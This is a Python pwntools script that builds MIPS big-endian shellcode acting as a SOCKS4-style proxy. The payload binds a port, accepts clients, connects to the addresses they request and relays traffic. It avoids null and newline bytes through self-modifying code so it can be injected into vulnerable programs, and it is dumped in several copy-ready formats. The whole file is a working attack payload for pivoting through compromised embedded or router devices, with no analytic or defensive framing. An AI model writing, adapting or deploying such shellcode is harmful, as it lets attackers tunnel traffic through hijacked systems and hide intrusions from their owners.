from pwn import *
import ctypes, struct, sys, os, socket

context.update(arch="mips", os="linux", endian="big")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=-1', '--geometry=128x98+1100+0', '-e']
#context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'error'

if (len(sys.argv) < 3):
  print('%s <IP> <PORT> [RUN]' % (sys.argv[0]))
  exit(1)

# define HOST & PORT here or in command line
IP, PORT = (sys.argv[1], int(sys.argv[2],10)) if len(sys.argv) > 2 else ('127.0.0.1', 12490)

def sockaddr():
    family = struct.pack('H', 0xff02)
    portbytes = struct.pack('H', socket.htons(PORT))
    ipbytes = socket.inet_aton(IP)
    number = struct.unpack('Q', family + portbytes + ipbytes)
#    number = -number[0]        #negate
    return hex((number[0] + (1 << 64)) % (1 << 64))

def dumpit(shellc):
  print('shellcode length: {:d} bytes'.format(len(shellc)))
  # dump as hex number array
  print('\n\"\\x{}\"'.format('\\x'.join([format(b, '02x') for b in bytearray(shellc)])))
  # dump as C array
  print("\nunsigned char shellc[] = {{{}}};".format(", ".join([format(b, '#02x') for b in bytearray(shellc)])))
  # dump as hex array
  print('\nproblematic values are highlighted (00,0a,20)...\n')
  print(hexdump(shellc, highlight=b'\x0a\x20\x00'))

shellc = asm ('''
	/* s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); */
	li $v0, 4183
	addiu $a0, $v0, -4181		/* 2 */
	sh	$a0,-20($sp)
	addiu $a1, $v0, -4181		/* 2 */
	slti $a2, $zero, -1 		/* 0 */

	/* self modifying code for zeroing, zero bytes in opcodes.. */
p:      bltzal  $v0, p                  /* ra will be used for code patching, now pointing to pc+4 */
	addiu	$ra,$ra,((patch1+4)-(p+8))+0x410
	sb	$a2, -0x412($ra)
	addiu   $ra,$ra,(patch2-patch1)
	sb	$a2, -0x412($ra)

	syscall 0x40404
	addiu $s0, $v0, 0x4141		/* sock + 0x4141 */

	/* bind(s, &sa, sizeof(sa)); */
	li $v0,4169
	addiu $a0, $s0, -0x4141
	addiu $a2, $v0, -4153		/* 16 */
	li $t0,%d
	sh $t0, -18($sp)
	li $t0,%d
	sw $t0, -16($sp)
	addiu	$a1,$sp,-20
	syscall 0x40404

	/* listen(s,backlog) */
	li $v0,4174
	addiu $a0, $s0, -0x4141		/* a0 = sock */
	addiu $a1,$v0,-4154
	syscall 0x40404
accept:
	/* accept */
	addiu $a0, $s0, -0x4141         /* a0 = sock */
	slti $a1, $zero, -1
	slti $a2, $zero, -1
	li $v0,4168
	syscall 0x40404
	addiu $s1,$v0, 0x4242		/* client sock in $s1 */

	/* fork 1 */
	li $v0,4002
	syscall 0x40404
patch1:	
	.byte 0x10,0x40,0x41,0x0f					/* beq $v0,$zero,fork2 */
	/* waitpid */
	li $v0,4007
	add $a1,$sp,-24
	syscall 0x40404
	/* close */
	li $v0,4006
	addiu $a0, $s1, -0x4242
	syscall 0x40404
	beq	$a0,$a0,accept

nogood:
	li $a3,0x15b
	sb $a3,-15($sp)
	addiu $a0, $s1, -0x4242
	/* write */
	li $v0,4004
	addiu $a2,$v0,-(4004-8)
	syscall 0x40404
exit:
	li $v0,4001
	syscall 0x40404

fork2:
	li $v0,4002
	syscall 0x40404
	bne $v0,$zero,exit

read:
	/* read */
	li $v0,4003
	addiu	$a1,$sp,-16
	addiu $a0, $s1, -0x4242
	addiu $a2, $v0, -3994		/* $a2 = 9 */
	syscall 0x40404
	bne $v0,$a2,exit

	li	$a2,0x401
	lh	$a0,-16($sp)
	bne	$a0,$a2, nogood
socket2:
	/* s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); */
	li $v0, 4183
	addiu $a0, $v0, -4181           /* 2 */
        addiu $a1, $v0, -4181           /* 2 */
        slti $a2, $zero, -1             /* 0 */
	syscall 0x40404
	addiu $s0, $v0, 0x4141          /* sock + 0x4141 */
connect:
	sh $a1,-16($sp)
	addiu $a0,$s0,-0x4141
	li $v0,4170
	addiu $a2,$v0,-4154		/* $a2 = 16 */
	addiu $a1,$sp,-16
	syscall 0x40404
	bne $v0,$zero,nogood
	/* answer */
	li $v0,4004
        addiu $a3,$v0,-(4004-0x5a)
        sh $a3,-16($sp)
        addiu $a0, $s1, -0x4242
	addiu $a2,$v0,-(4004-8)
        syscall 0x40404
poll:
	li $v0,4188
	addiu $a0,$s0,-0x4141
	addiu $a3,$v0,-4187 
	sll $a3,$a3,16
	sw $a3,-20($sp)
	sw $a0,-24($sp)
	addiu $a0,$s1,-0x4242
	sw $a3,-28($sp)
	sw $a0,-32($sp)
	addiu $a0,$sp,-32
	addiu $a1,$v0,-4186
	li $a2,0xffff
	syscall 0x40404
	blez $v0, exit

	li $v0,4003		/* read */
	add $s3,$v0,-4002	/* s3 = 1 */
	lb $a2,-25($sp)
	and $a2,$s3,$a2
	addiu $a0,$s0,-0x4141
	addiu $s2,$s1,-0x1212
patch2:	/*	beq $a2,$zero,next*/
	.byte 0x10,0xc0,0x41,((next-patch2)/4)-1

	addiu $a1,$sp,-1056	/* will be executed for the two cases */
        addiu $a0,$s1,-0x4242
        addiu $s2,$s0,-0x1111
next:	addiu $a2,$v0,-(4003-1024)
	syscall 0x40404
	blez $v0, exit
	add $a2,$v0,$zero
	li $v0,4004
	addiu $a0,$s2,-0x3030
	syscall 0x40404
        b poll

''' % ( u16(p16(socket.htons(PORT),endian="little")), u32(socket.inet_aton(IP)) ) )

# remove padding nop added by gas eventually
if shellc[-4:] == b'\x00'*4:
	shellc=shellc[0:-4]


dumpit(shellc)

if args.EXE:
  ELF.from_bytes(shellc).save('binary')

if args.RUN:
  p = run_shellcode(shellc)
  p.interactive()
elif args.GDB:
  p = debug_shellcode(shellc, gdbscript='''
    # set your pwndbg path here
    source ~/gdb.plugins/pwndbg/gdbinit.py
    set show-flags on
    set show-retaddr-reg on
    set show-compact-regs on
    context
  ''')
  p.interactive()
